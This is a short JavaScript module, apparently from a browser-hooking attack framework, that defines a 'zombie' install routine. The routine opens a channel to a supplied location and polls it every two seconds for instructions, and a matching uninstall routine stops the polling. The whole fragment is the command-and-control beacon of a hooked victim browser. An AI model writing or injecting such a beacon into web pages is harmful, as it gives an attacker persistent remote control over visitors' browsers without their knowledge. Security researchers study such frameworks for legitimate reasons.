ZombieAPI.Zombie = {};
ZombieAPI.Zombie.timer = null;
ZombieAPI.Zombie.channel = null;
ZombieAPI.Zombie.install = function (channelLocation, interval) {
	if (ZombieAPI.Zombie.timer != null)
		return;
	
	var interval = (interval == undefined)?2000:interval;
	var channel = ZombieAPI.Channel.createInteractiveChannel(channelLocation);
	
	ZombieAPI.Zombie.timer = setInterval(channel.pull, interval);
	ZombieAPI.Zombie.channel = channel;
};
ZombieAPI.Zombie.uninstall = function () {
	if (ZombieAPI.Zombie.timer == null)
		return;
		
	clearInterval(ZombieAPI.Zombie.timer);
	ZombieAPI.Zombie.timer = null;
};
